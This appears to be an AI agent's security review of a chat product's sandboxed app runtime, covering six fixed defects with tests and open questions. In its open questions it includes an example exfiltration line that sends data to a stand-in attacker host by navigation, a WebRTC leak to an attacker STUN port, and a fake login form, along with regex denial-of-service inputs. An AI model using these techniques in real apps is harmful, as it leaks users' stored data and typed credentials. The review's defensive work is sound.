# RV-2A — independent security review of Slice 2's App sandbox

**Scope:** the App's runtime and storage as built in `git log 2bf644aa..2d8d0cbf`:
`src/lib/server/services/artifacts/app/{bootstrap,sandbox-response,storage,contract,audit}.ts`, the served, kv,
download and regenerate routes under `src/routes/api/artifacts/[id]/app/`,
`src/lib/components/artifacts/app/{AppFrame,AppBody}.svelte`, the kv limits (`artifacts/{limits,kv}.ts`, ruling 48)
and `tests/cross-cutting/incognito-artifact-containment.test.ts`. Reviewed against `AGENTS.md` (Artifacts),
`slice-2.md` §Global Constraints, Review Focus 4, 5, 6 and 9, the served-app/CSP/bridge/storage Contracts, Tasks A4,
A5, A6 and A10, and `decisions.md` rulings 48, 49 and 51. Not touched: `generate*.ts`, `verify.ts`, `create.ts`,
`regenerate.ts` and `scripts/eval-artifact-contracts/`, which another agent is changing.

**Method:** every defect below was reproduced red first (the red line is quoted), fixed with the smallest change in
the App's own runtime files, and re-verified; one commit per defect, each passing the App suites on its own. Where the
browser's behaviour decides the question, it was measured in real Chromium (Playwright's 147), not assumed: jsdom
differs from browsers on exactly the property behind finding 1, which is why the unit suite could not see it.

## Verdict: **merge with these fixes**

The sandbox itself holds: the frame attribute is exactly `allow-scripts` at the one place an App ever runs, the CSP
is the Contracts' exact string and survives the hooks untouched, a directly opened App is opaque-origin with no
cookie, no storage and no `fetch`, forged conversation ids never widen the kv scope, and the `.html` export can only
take the restricted preview branch. But the bridge's per-artifact isolation — the property Review Focus 4 exists for —
broke under ordinary UI use: switching between two Apps in the panel let one App write, and read, the other's
storage. With it, an unbounded bridge fan-out, an incognito regenerate that always 404s, and three smaller defects.
All six are fixed on this branch; its HEAD is what I would merge.

## Findings

Locations are at `2d8d0cbf`, where the defect lives.

| # | Severity | Where | What breaks, for whom | Test (red line) | Commit |
|---|---|---|---|---|---|
| 1 | **High** | `components/artifacts/app/AppFrame.svelte:207-214` (the iframe, `src` changed in place), trust check `:139`, id read `:172` | The panel's open-documents rail switches between two Apps by changing the body's `artifactId` under a live `AppBody` (same kind, same cached loader), so `AppFrame` only changed `src`. A browser keeps **one WindowProxy per iframe element** across navigations, so the outgoing App's document — alive until the next one commits — still passed `event.source === frame.contentWindow` with origin `"null"`, and every storage call it made was served against the **incoming** App's id from the prop. Measured in Chromium: 39 of 40 messages an outgoing document posted during a 150 ms navigation passed the check and were attributed to the new app. End to end: one App's 5 ms autosave landed as a row in another App's `artifact_kv` through the real kv route — a debounced save firing as the user switches does the same to real data, and a hostile App can also *read* the other App's values (the reply goes to the proxy, which still shows the old document mid-navigation). The same reuse let a reply to the previous version's pending call reach the reloaded document, whose request ids restart at 1. Fix: `{#key src}` — one element per served document, so each has its own WindowProxy and removing the element ends the old one. | `AppFrame.test.ts`: `a message from the previous app's document, arriving after the panel switched apps, is not served against the new app` — red: `expected "vi.fn()" to not be called at all, but actually been called 1 times … Received: "app-b", "notes"`; `a reply to a request the previous version's document made is never delivered to the reloaded document` — red: `expected "Mock" to not be called at all, but actually been called 1 times`; plus a guard that the remounted document is still answered. These pin the browser's WindowProxy behaviour explicitly (`pinWindowProxyPerElement`), because jsdom hands out a new window on every `src` change. `tests/e2e/artifact-app.spec.ts`: `switching apps in the rail never lets the outgoing app write into the incoming app's storage` — red: `expect(quietRows).toEqual([])`, received `[{ "key": "chatty" }]` | `16db33bb` |
| 2 | **Medium** | `client/api/artifacts.ts:161-177` (`regenerateApp`, body `{ prompt, expectVersion }` at `:172`); `AppBody.svelte:169` | Ruling 51: an incognito conversation's artifacts are readable only when the request names that conversation, and the regenerate route reads it from the body (`regenerate/+server.ts:43`). The client had no parameter for it and AppBody sent none, so **every App in an incognito chat answered 404** to "Ask Alfy for a new version". The existing e2e's `toMatchObject` let the missing field through. | `AppBody.test.ts`: `passes the panel's conversationId to regenerateApp …` — red: `expected "vi.fn()" to be called with arguments: [ 'app-1', …(3) ]` (no `"panel-conv"`); `artifacts.test.ts`: `sends the panel's conversationId in the body …` — red: `TypeError: fetchImpl is not a function`; the e2e request-shape check now names the field | `36845442` |
| 3 | **Medium** | `AppFrame.svelte:133-193` (`handleMessage`) | Every accepted message became an immediate authenticated request to the kv route (two scoped reads for a get; three and a write transaction for a set) with **no bound on how many were outstanding**: 200 concurrent requests for an App loading 200 keys at start, 5,000 for a 5,000-message burst. A buggy save loop or a hostile App takes the browser's per-host connections from the chat's own requests and the server's time from every user. Fix: four calls in flight and a first-in, first-out backlog of 256 (it still holds an App loading every key the store allows, 200, at start); past it the frame is flooding and the excess is dropped without a reply, like every other refused message. | `AppFrame.test.ts`: `keeps only a few calls in flight at once, and still answers every call of a startup burst` — red: `expected 200 to be less than or equal to 8`; `drops what a frame posts past a bounded backlog …` — red: `expected 5000 to be less than or equal to 300` | `c13b263c` |
| 4 | **Low** | `client/api/artifacts.ts:141` (`JSON.stringify({ key, value })`) | postMessage's structured clone carries a `BigInt` and a cyclic object into the parent intact; `JSON.stringify` threw, the throw landed in the bridge's network-failure branch, and the app got **no reply**: a five-second wait and "alfy.storage timed out" instead of the contract's `not_serialisable` refusal and its localised "cannot be saved" line. | `artifacts.test.ts`: `refuses a BigInt or a cyclic value as not_serialisable, without a request` — red: `promise rejected "TypeError: Do not know how to serialize a BigInt" instead of resolving` | `88cea7cd` |
| 5 | **Low** (latent) + **Low** (pre-existing, DoS) | `artifacts/app/bootstrap.ts:68-80` (`injectAppBootstrap`) | Placement: `/<head[^>]*>/i` also matches `<header>`, so in a valid document with no `<head>` start tag (it is optional) the bootstrap landed after an early app script, which then ran without storage; and a document with a doctype but neither tag got the bootstrap **before its doctype**, which drops the doctype and renders the app in quirks mode (Chromium: `BackCompat`). All ten recorded eval apps carry an explicit `<head>`, so this was latent. Cost: this runs on **every request for an App**, over model-authored text, and `[^>]*>` rescanned the rest of the document for every opening with no `>` after it — quadratic: 192 KB of unclosed `<head ` took 2.3 s per request (≈0.5 s at the generator's 24k-token cap, minutes at the 2 MiB body cap). Fix: match only the tag's opening and find its `>` with `indexOf` (what `[^>]*>` meant), and walk the leading whitespace and comments by hand to the doctype. Every pathological shape at 2 MiB now takes ≤ 10 ms; checked in Chromium that both shapes render in standards mode, keep the app's `<html lang>`, and the app's first script sees the bridge. **Note on my own work:** my first version matched the doctype with `(?:\s|<!--[\s\S]*?-->)*`, which backtracks exponentially (36 empty comments: 112 s). I caught it with a benchmark after committing it and folded the linear rewrite into the same commit with a fixup/autosquash, so no commit on this branch carries it. | `bootstrap.test.ts`: `is not fooled by <header> …` — red: `expected 90 to be less than 35`; `keeps a leading doctype first …` — red: `expected false to be true`; `finds its splice point without rescanning the document for every unclosed tag` — red: `expected 2301.86 to be less than 250`; `finds its splice point without backtracking over a run of comments` — red (against the intermediate pattern): `expected 112098.43 to be less than 250` | `be4100cb` |
| 6 | **Low** | `AppBody.svelte:60-67` (`load`) | The same rail switch changes `artifactId` under a live `AppBody`, which kept the previous App's detail until the next one arrived; and when the previous App's fetch answered last (a larger body is a slower answer) its detail replaced the current one for good. The next App's frame then ran under the previous App's "Alfy checked the facts in this app", its glitch lines and its Code tab — the frame right, every trust signal around it wrong. Fix: a load for another App drops the shown detail at once and discards an answer for an App the card has left; a reload of the same App after a regenerate still keeps the old detail until the new one lands. (The detail read is `untrack`ed: `load` runs inside the effect that follows `artifactId`, and a tracked read would re-run it forever.) | `AppBody.test.ts`: `does not show the previous App's verification line under the next App's frame while it loads` and `a slow answer for the previous App never replaces the current App's detail` — red (both): `expected <div …(1)></div> to be null` | `f9963db8` |

No schema, migration, dependency, `biome.json`, `ALLOWED_WITHOUT_SCOPE` or Fallow-config change. No new i18n key (finding 4 reuses `artifacts.app.storage.notSerialisable`).

## Hunt list — what checked out clean

1. **`sandbox` is exactly `allow-scripts`, everywhere an App can run.** `AppFrame` is the only render site: it is used
   only by `AppBody`, which is mounted only by `DocumentWorkspace`'s two surface branches (one `previewRendererSurface`
   state, so never both); `ArtifactCard` never renders an App body inline, and an `app` kind always dispatches to
   `AppBody`, so the other iframe in the product (`DocumentPreviewRenderer`) never receives one. The attribute is a
   literal, with no prop or default that could widen it; the unit tests and the e2e assert the exact string.
2. **The CSP.** Exactly the Contracts' string, from one exported constant. Through the real server and hooks the
   response keeps it unmodified (the hooks only rewrite the CSP of a SvelteKit *page*, keyed on
   `x-sveltekit-page`), with `text/html; charset=utf-8`, `nosniff`, `no-store`, and the hooks'
   `Referrer-Policy: strict-origin-when-cross-origin`. The direct-open case, measured in a tab: `self.origin` is
   `"null"`, `document.cookie` and `localStorage` throw `SecurityError`, `fetch('/api/artifacts')` is refused. The 404
   variant is fixed JSON (`{"ok":false,"reason":"not_found"}`, `application/json`, `nosniff`) carrying no model
   content, so a CSP there would protect nothing. A `<meta http-equiv>` in the app can only add policy, and `sandbox`
   is ignored in a meta CSP. Measured under the exact header and attribute: `fetch` and a remote `<img>` are refused.
3. **The bootstrap.** Injected before the app's own scripts (now for every valid document shape, finding 5),
   `window.alfy` non-writable and non-configurable. Worth saying plainly for whoever reads this next: the bootstrap is
   **not** a privilege boundary — the app shares its realm and can post the same messages by hand — so its integrity
   is about robustness, and every trust decision is the parent's.
4. **The bridge.** Source, `"null"` origin, `v`/`kind`/method/id/args clauses in that order; the artifact id is the
   prop, never the payload; replies go to `event.source` only; unknown methods and malformed payloads are dropped with
   no call. No other `message` listener exists anywhere in the app (`grep` over `src`), so a frame's message cannot
   reach any other parent handler.
5. **Storage ownership and incognito.** Every reader resolves through `readScopedArtifactRow`. A scratch test (not
   committed) confirmed that a forged `conversationId` never widens scope — another user's conversation, the owner's
   other incognito conversation, an ordinary one, none, and another user naming the owner's incognito conversation:
   all `not_found` on `getArtifact`, `readAppValue` and `writeAppValue`, with the stored row unchanged. A non-App is
   `not_found`. Ruling 48's total is enforced inside `setKv`'s synchronous better-sqlite3 transaction and refuses
   before any write. The key and size pre-checks come before the scoped read, so their answers are the same for a
   foreign and a missing id. Nothing in the path writes to the console.
6. **The export (Review Focus 9).** The download route hard-codes `sourceMode: "program"`; for a program-mode job
   `resolvePreviewProfile` returns nothing (only `document_source` earns `standard-report`), so a previewed File card
   gets `RESTRICTED_PREVIEW_CSP`, `allowsTrustedHtmlPreviewRuntime` answers `false`, and the preview renders a
   sanitised static `srcdoc` under `sandbox=""`. The knowledge-library path passes no profile and is restricted too.
   The download itself is `Content-Disposition: attachment` with `private, no-store`. No policy change is needed.
7. **A stale App after regeneration.** The served document is `no-store`, neither service worker has a `fetch`
   handler, the frame is now a new element per version (finding 1), and the card's detail follows the App it shows
   (finding 6).
8. **Route hygiene.** `requireApiUser` is the first statement in all four routes (behind the hooks' own 401);
   success bodies are `{ ok: true, … }`; a missing and a foreign id give byte-identical 404 bodies, measured through
   the real server.

## Open questions (no code — a spec or owner decision, or not a defect)

1. **The sandbox silently disables three things generated apps do (owner, Medium).** Measured in Chromium under the
   product's exact attribute and CSP: a `<form>`'s `submit` event **never fires** (no `allow-forms`: "Blocked form
   submission … the 'allow-forms' permission is not set"), `confirm()` returns `false` and `alert`/`prompt` are
   ignored (no `allow-modals`), and `eval`/`new Function` throw `EvalError` (no `'unsafe-eval'`). **Four of the ten
   recorded eval apps are hit:** `app-02`, `app-03` and `app-08` put their primary action (Add / Calculate) on a form
   submit, so it is dead in the panel; `app-01`'s "delete everything" goes through `confirm()` and never runs. The eval
   scores all four "works" because it never runs an app under the product's frame and CSP (Review Focus 7). Measured
   options: adding `allow-forms` to both the attribute and the CSP's `sandbox` directive makes the `submit` event fire
   while `form-action 'none'` still refuses the actual submission ("violates … form-action 'none'"), so it adds no
   exfiltration path; or add contract rules plus audit glitches for form-submit reliance, `alert(`/`confirm(`/`prompt(`
   and `eval(`/`new Function(`; and run the eval's browser pass inside the product's frame and CSP either way. The
   sandbox string is pinned by the spec, so this is not mine to change.
2. **Exfiltration the CSP cannot stop (spec, Medium).** The Contracts say the app "cannot reach another origin"; the
   platform disagrees. Measured under the exact header and attribute: a self-navigation
   (`location.href = "http://attacker/?d=…"`) **delivered `/navigate?d=secret`** to a second local server, and a
   WebRTC peer connection sent **three UDP packets** to an attacker-chosen STUN port — Chromium 147 reports
   `Unrecognized Content-Security-Policy directive 'webrtc'`, and there is no `navigate-to`. An App can leak what it
   holds: its own stored values and whatever the user types into it — including into a fake "sign in again" form it
   draws inside the panel. Mitigations to decide on: audit and verification flags for `location` assignment, an
   external `href`, `http-equiv="refresh"` and `RTCPeerConnection`; the parent tearing the frame down with a notice on
   a `load` event it did not cause (after the fact, but it ends a phishing flow); a visible treatment that marks the
   App area as the app's own content, never Alfy's chrome.
3. **The audit's regexes are quadratic on unclosed tags (Low).** `auditAppHtml` runs server-side per generation
   attempt; 96 KB (the 24k-token output cap) of `<img ` takes 645 ms (`<script ` 403, `<link ` 531, `<meta ` 546). A
   bounded `[^>]{0,4096}` gives the same verdict for any real tag, but the spec pins the prototype's regexes, so it is
   the owner's call.
4. **The bootstrap accepts a reply from any window (Low, hardening).** Its `message` listener does not check
   `event.source === window.parent`, so a window holding a reference to the App's frame could resolve its pending
   promises with forged values. Not reachable today — the App can open no popup or nested frame under its CSP, and the
   only other frame in the product never renders beside an App — which is why it is here and not in the table. One
   line when wanted.
5. **Two quick `set`s of one key can still land out of order (Low, pre-existing).** Finding 3 keeps four calls in
   flight (it was all of them), so an older snapshot of a whole-state key can still be the one persisted when
   saves overlap, as a slider's `input` events do. Serialising per key would close it. Related residual: the backlog
   bounds how many calls the parent retains (260), not how large each value is — a hostile App posting very large
   values can still press on the parent tab's memory until the server refuses them as `too_large`. A per-call byte
   bound in the parent would need a client-side copy of the value cap, which lives in a server-only module today.
6. **The download error is a raw reason code (Low, i18n).** `AppBody` renders `result.reason` (for example
   `conversation_required` or an intake code) as the error text, untranslated in both locales.
7. **The kv read carries no `Cache-Control: no-store` (Info).** The served App does; the kv `GET`, whose body is the
   user's stored data, has only the hooks' `nosniff`. Not heuristically cacheable today (no validator), but a header
   would make it explicit.
8. **A non-string key is coerced, not refused (Info).** The Contracts say the parent refuses one; `AppFrame` does
   `String(args[0])`. Reachable only by a hand-posted message (the bootstrap already coerces), and harmless.
9. **An expired session shows the login page inside the sandboxed frame (Info).** The hooks answer
   `Sec-Fetch-Dest: iframe` with a 303 to `/login`, which renders in the panel with its form dead (no `allow-forms`). A
   401 for this route would let the card show its own "could not be opened".
10. **The Code tab is unhighlighted unless the chat already initialised Shiki (Info, not security).** `AppBody` calls
    the synchronous `renderCodeBlock` without preparing the highlighter or its `html` grammar, so it falls back to
    escaped plain text (safe either way: both branches are sanitised).

## Gate summary

Full gate run at the last fix commit (`gates.sh … rv-2a 5580 rv-2a tests/e2e/artifact-app.spec.ts
tests/e2e/artifacts-panel.spec.ts`, which also runs `chat.spec.ts` and `conversation.spec.ts`; `npm run lint` is broken
by nested worktrees, so biome ran as `npx biome check src scripts tests`):

```
gates rv-2a at f9963db8 fix(artifacts): keep an App card's verification line and code w — start 04:48:31
check      exit=0 :: COMPLETED 7807 FILES 0 ERRORS 17 WARNINGS 3 FILES_WITH_PROBLEMS
biome      exit=0 :: Checked 2003 files in 554ms. No fixes applied.
migrations exit=0 :: All schema tables have corresponding migrations.
test       exit=0 ::  Test Files 840 passed | 1 skipped (841)  Tests 12657 passed | 2 skipped (12659)
build      exit=0 :: unused-css=32 aria=2 (baseline 32/2)
fallow     exit=0 :: total=125 circular=5 new_vs_baseline=1 gone_vs_baseline=0
playwright exit=0 ::  35 passed (1.4m)
```

| Gate | At `2d8d0cbf` | Now |
|---|---|---|
| `npm run check` | 0 errors / 17 warnings | 0 errors / 17 warnings |
| biome | clean | clean |
| `npm test` | 12,643 | **12,657** (+14, all this review's) |
| `npm run build` | 32 unused-CSS + 2 ARIA | 32 + 2 |
| Fallow | 125 / 5 circular | 125 / 5 circular — the one cycle the script marks new against its older baseline file is the known `app/create.ts → generate-and-verify.ts → verify.ts → normal-chat-tools/index.ts → artifact-tools/create.ts` one being fixed on `feat/artifacts-s2`; no file of this review is in it |
| containment suite | 30 | 30 (file unchanged; `ALLOWED_WITHOUT_SCOPE` untouched) |
| Playwright | 34 | **35** (+1, the rail-switch test) |
| `check:migrations` | unchanged | unchanged |

## Branch

`feat/artifacts-s2-review-sandbox`: six fix commits on `2d8d0cbf` (`16db33bb` … `f9963db8`, in the table's order),
each passing the App suites on its own, then the commit that adds this file. Not pushed, not merged.
